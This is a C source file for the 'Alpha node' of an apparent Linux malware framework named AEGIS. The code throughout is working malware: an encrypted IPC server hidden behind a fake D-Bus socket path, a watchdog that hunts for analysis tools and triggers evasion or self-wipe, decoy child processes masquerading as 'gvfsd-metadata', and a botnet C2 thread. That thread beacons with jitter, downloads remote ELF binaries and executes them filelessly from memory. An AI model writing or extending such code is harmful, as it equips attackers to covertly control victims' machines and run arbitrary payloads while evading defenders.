/*
 * ============================================================================
 *  AEGIS FRAMEWORK — Alpha Node (Command Orchestrator)
 * ============================================================================
 *  Classification : PRIVATE — LO/ENI EYES ONLY
 *  Component      : nexus_auditor/alpha_node.c
 *  Purpose        : The Alpha node is the first process to load the Nexus
 *                   Auditor.  It runs the IPC server on a Unix domain socket,
 *                   manages the Beta node registry, dispatches commands,
 *                   runs the Watchdog thread, and orchestrates the entire
 *                   process neural network.
 *
 *  Architecture   :
 *    Thread 1: IPC Server        — accepts Beta connections, dispatches cmds
 *    Thread 2: Watchdog           — scans for hostile analysis processes
 *    Thread 3: Heartbeat Monitor  — tracks Beta node liveness
 *    Thread 4: C2 Worker          — communicates with C2 server (Beacon/Tasking)
 *
 *  The Alpha node communicates with the C2 server (via the Ghost Loader)
 *  and distributes tasks/payloads to Beta nodes.
 * ============================================================================
 */

#include "../c2_comms/crypto.h"
#include "../c2_comms/c2_client.h"
#include "../common/config.h"
#include "../common/logging.h"
#include "../common/types.h"
#include "../common/loader.h"
#include "ipc_protocol.h"


#include <dirent.h>
#include <errno.h>
#include <poll.h>
#include <pthread.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <unistd.h>
#include <fcntl.h>


/* ── Global State ────────────────────────────────────────────────────────── */

static aegis_log_ctx_t *g_alpha_log = NULL;
static aegis_crypto_ctx_t *g_alpha_crypto = NULL;

static int g_server_fd = -1;
static char g_sock_path[512];

static aegis_beta_entry_t g_betas[AEGIS_IPC_MAX_BETA_NODES];
static int g_beta_count = 0;
static pthread_mutex_t g_beta_mutex = PTHREAD_MUTEX_INITIALIZER;

static pthread_t g_server_thread;
static pthread_t g_watchdog_thread;
static pthread_t g_heartbeat_thread;
static pthread_t g_c2_thread;
static volatile bool g_alpha_running = false;

/* ── Internal: IPC Socket Helpers ────────────────────────────────────────── */

static aegis_result_t create_ipc_socket(void) {
  const char *home = getenv("HOME");
  if (!home)
    return AEGIS_ERR_IPC;

  /* Construct socket path that looks like a D-Bus socket */
  uint32_t rand_id;
  aegis_random_bytes((uint8_t *)&rand_id, sizeof(rand_id));
  snprintf(g_sock_path, sizeof(g_sock_path), "%s/%s%08x%s", home,
           AEGIS_IPC_SOCK_PREFIX, rand_id, AEGIS_IPC_SOCK_SUFFIX);

  /* Remove stale socket */
  unlink(g_sock_path);

  g_server_fd = socket(AF_UNIX, SOCK_STREAM, 0);
  if (g_server_fd < 0)
    return AEGIS_ERR_SYSCALL;

  struct sockaddr_un addr;
  memset(&addr, 0, sizeof(addr));
  addr.sun_family = AF_UNIX;
  snprintf(addr.sun_path, sizeof(addr.sun_path), "%.107s", g_sock_path);

  if (bind(g_server_fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
    close(g_server_fd);
    g_server_fd = -1;
    return AEGIS_ERR_IPC;
  }

  /* Restrict socket permissions */
  chmod(g_sock_path, 0600);

  if (listen(g_server_fd, AEGIS_IPC_BACKLOG) < 0) {
    close(g_server_fd);
    unlink(g_sock_path);
    g_server_fd = -1;
    return AEGIS_ERR_IPC;
  }

  /* Write socket path to a discoverable location for Beta nodes */
  char sock_info_path[512];
  snprintf(sock_info_path, sizeof(sock_info_path), "%s/.cache/.dbus-info",
           home);
  FILE *f = fopen(sock_info_path, "w");
  if (f) {
    fprintf(f, "%s\n", g_sock_path);
    fclose(f);
    chmod(sock_info_path, 0600);
  }

  aegis_log_event(g_alpha_log, LOG_CAT_ALPHA, LOG_SEV_INFO,
                  "IPC socket created: %s", g_sock_path);

  return AEGIS_OK;
}

/* ── Internal: Send IPC Message ──────────────────────────────────────────── */

static aegis_result_t send_ipc_message(int sock_fd, aegis_ipc_cmd_t cmd,
                                       const uint8_t *payload, size_t len) {
  aegis_ipc_header_t hdr;
  memset(&hdr, 0, sizeof(hdr));
  hdr.magic = IPC_MAGIC;
  hdr.command = (uint16_t)cmd;

  if (payload && len > 0) {
    /* Encrypt the payload */
    uint8_t *ct = malloc(len);
    if (!ct)
      return AEGIS_ERR_ALLOC;

    aegis_result_t rc =
        aegis_encrypt(g_alpha_crypto, payload, len, (const uint8_t *)&hdr,
                      offsetof(aegis_ipc_header_t, iv), ct, hdr.iv, hdr.tag);
    if (rc != AEGIS_OK) {
      free(ct);
      return rc;
    }

    hdr.payload_len = (uint32_t)len;

    /* Send header + encrypted payload */
    if (send(sock_fd, &hdr, sizeof(hdr), MSG_NOSIGNAL) != sizeof(hdr)) {
      free(ct);
      return AEGIS_ERR_IPC;
    }
    if (send(sock_fd, ct, len, MSG_NOSIGNAL) != (ssize_t)len) {
      free(ct);
      return AEGIS_ERR_IPC;
    }

    free(ct);
  } else {
    hdr.payload_len = 0;
    if (send(sock_fd, &hdr, sizeof(hdr), MSG_NOSIGNAL) != sizeof(hdr))
      return AEGIS_ERR_IPC;
  }

  aegis_log_ipc(g_alpha_log, cmd, (pid_t)getpid(), 0, len, "Alpha -> Beta");

  return AEGIS_OK;
}

/* ── Internal: Receive IPC Message ───────────────────────────────────────── */

static aegis_result_t recv_ipc_message(int sock_fd, aegis_ipc_header_t *hdr,
                                       uint8_t **payload_out,
                                       size_t *payload_len) {
  *payload_out = NULL;
  *payload_len = 0;

  /* Receive header */
  ssize_t n = recv(sock_fd, hdr, sizeof(*hdr), MSG_WAITALL);
  if (n != sizeof(*hdr))
    return AEGIS_ERR_IPC;

  if (hdr->magic != IPC_MAGIC)
    return AEGIS_ERR_AUTH;

  if (hdr->payload_len > 0) {
    if (hdr->payload_len > AEGIS_IPC_MAX_MSG_SIZE)
      return AEGIS_ERR_IPC;

    uint8_t *ct = malloc(hdr->payload_len);
    if (!ct)
      return AEGIS_ERR_ALLOC;

    n = recv(sock_fd, ct, hdr->payload_len, MSG_WAITALL);
    if (n != (ssize_t)hdr->payload_len) {
      free(ct);
      return AEGIS_ERR_IPC;
    }

    /* Decrypt */
    *payload_out = malloc(hdr->payload_len);
    if (!*payload_out) {
      free(ct);
      return AEGIS_ERR_ALLOC;
    }

    aegis_result_t rc = aegis_decrypt(
        g_alpha_crypto, ct, hdr->payload_len, (const uint8_t *)hdr,
        offsetof(aegis_ipc_header_t, iv), hdr->iv, hdr->tag, *payload_out);
    free(ct);
    if (rc != AEGIS_OK) {
      free(*payload_out);
      *payload_out = NULL;
      return rc;
    }

    *payload_len = hdr->payload_len;
  }

  return AEGIS_OK;
}

/* ── Internal: Handle Beta Connection ────────────────────────────────────── */

static void handle_beta_connection(int client_fd) {
  aegis_ipc_header_t hdr;
  uint8_t *payload = NULL;
  size_t payload_len = 0;

  aegis_result_t rc = recv_ipc_message(client_fd, &hdr, &payload, &payload_len);
  if (rc != AEGIS_OK) {
    close(client_fd);
    return;
  }

  switch (hdr.command) {
  case CMD_HEARTBEAT: {
    if (payload_len >= sizeof(ipc_heartbeat_t)) {
      ipc_heartbeat_t *hb = (ipc_heartbeat_t *)payload;

      pthread_mutex_lock(&g_beta_mutex);

      /* Find or register this Beta */
      int slot = -1;
      for (int i = 0; i < g_beta_count; i++) {
        if (g_betas[i].id.pid == hb->pid) {
          slot = i;
          break;
        }
      }

      if (slot < 0 && g_beta_count < AEGIS_IPC_MAX_BETA_NODES) {
        slot = g_beta_count++;
        g_betas[slot].id.pid = hb->pid;
        g_betas[slot].id.tid = hb->tid;
        g_betas[slot].sock_fd = client_fd;
        g_betas[slot].alive = true;

        aegis_log_event(g_alpha_log, LOG_CAT_ALPHA, LOG_SEV_INFO,
                        "New Beta registered: pid=%d (total=%d)", hb->pid,
                        g_beta_count);
      }

      if (slot >= 0) {
        g_betas[slot].last_heartbeat_ns = aegis_timestamp_ns();
        g_betas[slot].alive = true;
      }

      pthread_mutex_unlock(&g_beta_mutex);

      aegis_log_ipc(g_alpha_log, CMD_HEARTBEAT, hb->pid, (pid_t)getpid(),
                    payload_len, "Beta heartbeat received");
    }
    break;
  }

  case CMD_WATCHDOG_ALERT: {
    if (payload_len >= sizeof(ipc_watchdog_alert_t)) {
      ipc_watchdog_alert_t *alert = (ipc_watchdog_alert_t *)payload;
      aegis_log_event(g_alpha_log, LOG_CAT_WATCHDOG, LOG_SEV_WARN,
                      "Watchdog alert: hostile process detected: "
                      "pid=%d comm=%s threat=%d",
                      alert->hostile_pid, alert->hostile_comm,
                      alert->threat_level);

      /* TODO: Implement evasion response based on
         AEGIS_WD_EVASION_STRATEGY */
    }
    break;
  }

  case CMD_STATUS_QUERY: {
    /* Beta requesting status — respond with our current state */
    ipc_status_resp_t resp;
    memset(&resp, 0, sizeof(resp));
    resp.pid = getpid();
    resp.node_type = (uint8_t)NODE_ALPHA;
    resp.hooks_active = 0;
    resp.chunks_held = 0;
    resp.status = 1; /* Active */

    send_ipc_message(client_fd, CMD_STATUS_QUERY, (const uint8_t *)&resp,
                     sizeof(resp));
    break;
  }

  default:
    aegis_log_event(g_alpha_log, LOG_CAT_ALPHA, LOG_SEV_WARN,
                    "Unknown command from Beta: 0x%04x", hdr.command);
    break;
  }

  free(payload);
  /* Keep the socket open for persistent Beta connections */
}

/* ── Thread: IPC Server ──────────────────────────────────────────────────── */

static void *ipc_server_thread(void *arg) {
  (void)arg;

  aegis_log_event(g_alpha_log, LOG_CAT_ALPHA, LOG_SEV_INFO,
                  "IPC server thread started");

  while (g_alpha_running) {
    struct pollfd pfd = {
        .fd = g_server_fd,
        .events = POLLIN,
    };

    int ret = poll(&pfd, 1, 1000); /* 1s timeout */
    if (ret <= 0)
      continue;

    if (pfd.revents & POLLIN) {
      int client_fd = accept(g_server_fd, NULL, NULL);
      if (client_fd < 0)
        continue;

      /* Handle in the same thread (simple threaded model) */
      handle_beta_connection(client_fd);
    }
  }

  return NULL;
}

/* ── Thread: Watchdog ────────────────────────────────────────────────────── */

static bool is_hostile_proc(const char *comm) {
  const char *list = AEGIS_WD_HOSTILE_PROCS;
  char buf[512];
  strncpy(buf, list, sizeof(buf) - 1);
  buf[sizeof(buf) - 1] = '\0';

  char *saveptr;
  char *tok = strtok_r(buf, ",", &saveptr);
  while (tok) {
    if (strcmp(comm, tok) == 0)
      return true;
    tok = strtok_r(NULL, ",", &saveptr);
  }
  return false;
}

static void *watchdog_thread(void *arg) {
  (void)arg;

  aegis_log_event(g_alpha_log, LOG_CAT_WATCHDOG, LOG_SEV_INFO,
                  "Watchdog thread started (scan interval=%dms)",
                  AEGIS_WD_SCAN_INTERVAL_MS);

  while (g_alpha_running) {
    struct timespec sleep_ts = {.tv_sec = AEGIS_WD_SCAN_INTERVAL_MS / 1000,
                                .tv_nsec = (AEGIS_WD_SCAN_INTERVAL_MS % 1000) *
                                           1000000L};
    nanosleep(&sleep_ts, NULL);

    if (!g_alpha_running)
      break;

    /* Scan /proc for hostile processes */
    DIR *proc = opendir(AEGIS_WD_PROC_SCAN_PATH);
    if (!proc)
      continue;

    struct dirent *entry;
    while ((entry = readdir(proc)) != NULL) {
      if (entry->d_name[0] < '0' || entry->d_name[0] > '9')
        continue;

      char comm_path[300];
      snprintf(comm_path, sizeof(comm_path), "/proc/%s/comm", entry->d_name);

      char comm[256] = {0};
      int fd = open(comm_path, O_RDONLY);
      if (fd < 0)
        continue;
      ssize_t n = read(fd, comm, sizeof(comm) - 1);
      close(fd);
      if (n <= 0)
        continue;

      /* Strip newline */
      char *nl = strchr(comm, '\n');
      if (nl)
        *nl = '\0';

      if (is_hostile_proc(comm)) {
        pid_t hostile_pid = (pid_t)atoi(entry->d_name);

        aegis_log_event(g_alpha_log, LOG_CAT_WATCHDOG, LOG_SEV_WARN,
                        "HOSTILE PROCESS DETECTED: %s (pid=%d)", comm,
                        hostile_pid);

        /*
         * Evasion response based on configured strategy:
         *   0 = ignore (log only)
         *   1 = self-migrate to new host process
         *   2 = go dormant (stop all activity)
         *   3 = full wipe (emergency cleanup)
         */
        switch (AEGIS_WD_EVASION_STRATEGY) {
        case 0:
          /* Log only */
          break;
        case 1:
          /* TODO: trigger migration */
          aegis_log_event(g_alpha_log, LOG_CAT_WATCHDOG, LOG_SEV_WARN,
                          "Evasion: migration triggered");
          break;
        case 2:
          /* Go dormant */
          aegis_log_event(g_alpha_log, LOG_CAT_WATCHDOG, LOG_SEV_WARN,
                          "Evasion: entering dormant state");
          /* Broadcast dormancy to all Betas */
          break;
        case 3:
          /* Emergency wipe */
          aegis_log_event(g_alpha_log, LOG_CAT_WATCHDOG, LOG_SEV_CRITICAL,
                          "Evasion: FULL WIPE initiated");
          /* TODO: broadcast CMD_TERMINATE to all Betas,
             wipe all memory, delete all files */
          break;
        }
      }
    }

    closedir(proc);
  }

  return NULL;
}

/* ── Internal: Decoy Beta Spawning ───────────────────────────────────────── */

extern char **environ;

static void spawn_decoy_beta(void) {
  /*
   * Spawn a benign process that inherits our LD_AUDIT environment.
   * This new process will load the auditor, fail the Alpha election
   * (since we hold the lock), and become a Beta node.
   */
  pid_t pid = fork();
  if (pid < 0)
    return;
  if (pid > 0)
    return; /* Parent returns */

  /* Child: detach and exec benign payload */
  setsid();

  /* Close standard FDs to avoid noise */
  int devnull = open("/dev/null", O_RDWR);
  if (devnull >= 0) {
    dup2(devnull, 0);
    dup2(devnull, 1);
    dup2(devnull, 2);
    if (devnull > 2)
      close(devnull);
  }

  /* Ensure we are not the Anchor (so it behaves as a normal beta) */
  unsetenv("AEGIS_ANCHOR");

  /*
   * Execute a long-running benign process.
   * We mask it as (gvfsd-metadata) to blend in with user session processes.
   */
  char *argv[] = {"(gvfsd-metadata)", "infinity", NULL};
  execve("/bin/sleep", argv, environ);

  exit(0);
}

/* ── Thread: Heartbeat Monitor ───────────────────────────────────────────── */

static void *heartbeat_monitor_thread(void *arg) {
  (void)arg;

  while (g_alpha_running) {
    struct timespec sleep_ts = {
        .tv_sec = AEGIS_IPC_HEARTBEAT_SEC,
        .tv_nsec = 0,
    };
    nanosleep(&sleep_ts, NULL);

    if (!g_alpha_running)
      break;

    uint64_t now = aegis_timestamp_ns();
    uint64_t timeout_ns = (uint64_t)AEGIS_IPC_DEAD_TIMEOUT_SEC * 1000000000ULL;

    pthread_mutex_lock(&g_beta_mutex);

    int active_betas = 0;
    for (int i = 0; i < g_beta_count; i++) {
      if (g_betas[i].alive) {
        if ((now - g_betas[i].last_heartbeat_ns) > timeout_ns) {

          aegis_log_event(g_alpha_log, LOG_CAT_ALPHA, LOG_SEV_WARN,
                          "Beta node DEAD: pid=%d (no heartbeat "
                          "for %ds)",
                          g_betas[i].id.pid, AEGIS_IPC_DEAD_TIMEOUT_SEC);

          g_betas[i].alive = false;

          if (g_betas[i].sock_fd >= 0) {
            close(g_betas[i].sock_fd);
            g_betas[i].sock_fd = -1;
          }
        } else {
          active_betas++;
        }
      }
    }

    /* Hydra Strategy: Maintain minimum mesh size */
    if (active_betas < 3) {
      aegis_log_event(g_alpha_log, LOG_CAT_ALPHA, LOG_SEV_INFO,
                      "Mesh size low (%d/3) — spawning Decoy Beta",
                      active_betas);
      spawn_decoy_beta();
    }

    pthread_mutex_unlock(&g_beta_mutex);
  }

  return NULL;
}

/* ── Thread: C2 Worker (Botnet) ──────────────────────────────────────────── */

static void *c2_worker_thread(void *arg) {
  (void)arg;

  aegis_log_event(g_alpha_log, LOG_CAT_ALPHA, LOG_SEV_INFO,
                  "C2 worker thread started");

  /* Initialize C2 client */
  aegis_c2_ctx_t c2;
  aegis_result_t rc = aegis_c2_init(&c2, g_alpha_crypto);
  if (rc != AEGIS_OK) {
    aegis_log_event(g_alpha_log, LOG_CAT_ALPHA, LOG_SEV_ERROR,
                    "C2 init failed (rc=%d)", rc);
    return NULL;
  }

  while (g_alpha_running) {
    /* Beacon to C2 and check for tasks */
    uint8_t task_buf[4096];
    size_t task_len = 0;

    rc = aegis_c2_beacon(&c2, task_buf, sizeof(task_buf), &task_len);
    if (rc == AEGIS_OK && task_len > 0) {
      /* Process tasking */
      char *task_str = (char *)malloc(task_len + 1);
      if (task_str) {
        memcpy(task_str, task_buf, task_len);
        task_str[task_len] = '\0';

        aegis_log_event(g_alpha_log, LOG_CAT_ALPHA, LOG_SEV_INFO,
                        "Received task: %s", task_str);

        /* Simple task parsing (format: "CMD ARG") */
        /* Currently we support: "exec <resource_id>" */

        if (strncmp(task_str, "exec ", 5) == 0) {
          const char *res_id = task_str + 5;
          aegis_log_event(g_alpha_log, LOG_CAT_ALPHA, LOG_SEV_INFO,
                          "Executing remote resource: %s", res_id);

          uint8_t *elf_bin = NULL;
          size_t elf_len = 0;

          rc = aegis_c2_fetch_resource(&c2, res_id, &elf_bin, &elf_len);
          if (rc == AEGIS_OK && elf_bin && elf_len > 0) {
            aegis_log_event(g_alpha_log, LOG_CAT_ALPHA, LOG_SEV_INFO,
                            "Resource fetched (%zu bytes), executing...", elf_len);

            /* Execute filelessly via memfd */
            /* Note: this forks, so Alpha stays alive. The child process runs the ELF. */
            rc = aegis_exec_from_memory(elf_bin, elf_len, res_id, NULL, NULL);
            if (rc != AEGIS_OK) {
               aegis_log_event(g_alpha_log, LOG_CAT_ALPHA, LOG_SEV_ERROR,
                               "Execution failed (rc=%d)", rc);
            }

            /* Secure wipe */
            AEGIS_WIPE(elf_bin, elf_len, 3);
            free(elf_bin);
          } else {
            aegis_log_event(g_alpha_log, LOG_CAT_ALPHA, LOG_SEV_ERROR,
                            "Failed to fetch resource (rc=%d)", rc);
          }
        }

        free(task_str);
      }
    }

    /* Wait for next beacon interval (with jitter) */
    uint32_t interval = aegis_c2_calculate_jitter(&c2);
    struct timespec ts = {
        .tv_sec = interval / 1000,
        .tv_nsec = (interval % 1000) * 1000000L
    };
    nanosleep(&ts, NULL);
  }

  aegis_c2_destroy(&c2);
  return NULL;
}

/* ── Public: Command Dispatch to Beta Nodes ──────────────────────────────── */

/*
 * Broadcast a command to all alive Beta nodes.
 */
aegis_result_t alpha_broadcast_command(aegis_ipc_cmd_t cmd,
                                       const uint8_t *payload, size_t len) {
  pthread_mutex_lock(&g_beta_mutex);

  int sent = 0;
  for (int i = 0; i < g_beta_count; i++) {
    if (g_betas[i].alive && g_betas[i].sock_fd >= 0) {
      aegis_result_t rc =
          send_ipc_message(g_betas[i].sock_fd, cmd, payload, len);
      if (rc == AEGIS_OK)
        sent++;
    }
  }

  pthread_mutex_unlock(&g_beta_mutex);

  aegis_log_event(g_alpha_log, LOG_CAT_ALPHA, LOG_SEV_INFO,
                  "Broadcast cmd=0x%04x to %d/%d Betas", cmd, sent,
                  g_beta_count);

  return (sent > 0) ? AEGIS_OK : AEGIS_ERR_IPC;
}

/*
 * Send a command to a specific Beta node by PID.
 */
aegis_result_t alpha_send_to_beta(pid_t target_pid, aegis_ipc_cmd_t cmd,
                                  const uint8_t *payload, size_t len) {
  pthread_mutex_lock(&g_beta_mutex);

  for (int i = 0; i < g_beta_count; i++) {
    if (g_betas[i].id.pid == target_pid && g_betas[i].alive) {
      aegis_result_t rc =
          send_ipc_message(g_betas[i].sock_fd, cmd, payload, len);
      pthread_mutex_unlock(&g_beta_mutex);
      return rc;
    }
  }

  pthread_mutex_unlock(&g_beta_mutex);
  return AEGIS_ERR_IPC;
}

/* ── Public: Start / Stop ────────────────────────────────────────────────── */

aegis_result_t alpha_node_start(aegis_log_ctx_t *log,
                                aegis_crypto_ctx_t *crypto) {
  g_alpha_log = log;
  g_alpha_crypto = crypto;

  aegis_log_event(g_alpha_log, LOG_CAT_ALPHA, LOG_SEV_INFO,
                  "=== Alpha Node initializing (pid=%d) ===", (int)getpid());

  /* Create IPC socket */
  aegis_result_t rc = create_ipc_socket();
  if (rc != AEGIS_OK)
    return rc;

  g_alpha_running = true;

  /* Start worker threads */
  pthread_create(&g_server_thread, NULL, ipc_server_thread, NULL);
  pthread_create(&g_watchdog_thread, NULL, watchdog_thread, NULL);
  pthread_create(&g_heartbeat_thread, NULL, heartbeat_monitor_thread, NULL);

  /* Start C2 worker thread (Botnet capability) */
  pthread_create(&g_c2_thread, NULL, c2_worker_thread, NULL);

  /* Detach threads so they clean up on their own */
  pthread_detach(g_server_thread);
  pthread_detach(g_watchdog_thread);
  pthread_detach(g_heartbeat_thread);
  pthread_detach(g_c2_thread);

  aegis_log_event(g_alpha_log, LOG_CAT_ALPHA, LOG_SEV_INFO,
                  "Alpha Node operational: IPC=%s, Watchdog=active, "
                  "Heartbeat=active, C2=active",
                  g_sock_path);

  return AEGIS_OK;
}

void alpha_node_stop(void) {
  g_alpha_running = false;

  /* Close all Beta connections */
  pthread_mutex_lock(&g_beta_mutex);
  for (int i = 0; i < g_beta_count; i++) {
    if (g_betas[i].sock_fd >= 0) {
      close(g_betas[i].sock_fd);
      g_betas[i].sock_fd = -1;
    }
  }
  g_beta_count = 0;
  pthread_mutex_unlock(&g_beta_mutex);

  /* Close server socket */
  if (g_server_fd >= 0) {
    close(g_server_fd);
    g_server_fd = -1;
  }

  /* Clean up socket file */
  if (g_sock_path[0])
    unlink(g_sock_path);

  aegis_log_event(g_alpha_log, LOG_CAT_ALPHA, LOG_SEV_INFO,
                  "Alpha Node stopped");
}
